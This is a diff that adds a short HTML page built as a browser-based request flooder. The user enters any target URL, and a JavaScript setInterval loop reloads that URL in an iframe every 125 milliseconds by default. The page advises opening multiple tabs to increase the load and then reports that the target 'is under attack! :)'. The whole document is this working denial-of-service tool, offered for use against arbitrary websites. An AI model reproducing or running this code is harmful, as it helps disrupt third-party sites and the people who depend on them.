@@ -1,0 +1,20 @@
+<html>
+
+<body style="text-align:center">
+    <p>It works better by opening multiple browser tabs</p>
+    <div>
+        <input type="text" id="url" placeholder="Target url - like: http://url.com">
+        <input type="text" id="time" value="125" placeholder="Refresh loop time(ms) - 125 recomended">
+        <input type="button" value="attack!" onclick="run()">
+    </div>
+    <iframe id="addr" width="800" height="600" sandbox></iframe>
+    <p id="des"></p>
+    <script>
+        function run() {
+            setInterval(function () { document.getElementById("addr").src = document.getElementById("url").value; }, document.getElementById("time").value);
+            document.getElementById("des").innerHTML = document.getElementById("url").value +" is under attack! :)"
+        }
+    </script>
+</body>
+
+</html>
